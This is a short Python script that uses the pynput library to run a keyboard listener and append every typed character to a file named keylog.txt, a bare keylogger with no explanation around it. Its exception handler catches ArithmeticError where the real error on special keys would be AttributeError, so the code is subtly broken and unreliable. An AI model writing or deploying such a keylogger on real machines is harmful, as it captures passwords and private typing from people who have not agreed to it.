from pynput import keyboard 

def on_press(key):
    try:
        with open("keylog.txt","a") as f:
            f.write(str(key.char))
    except ArithmeticError:
        pass
    


listener = keyboard.Listener(on_press=on_press)

listener.start()

listener.join()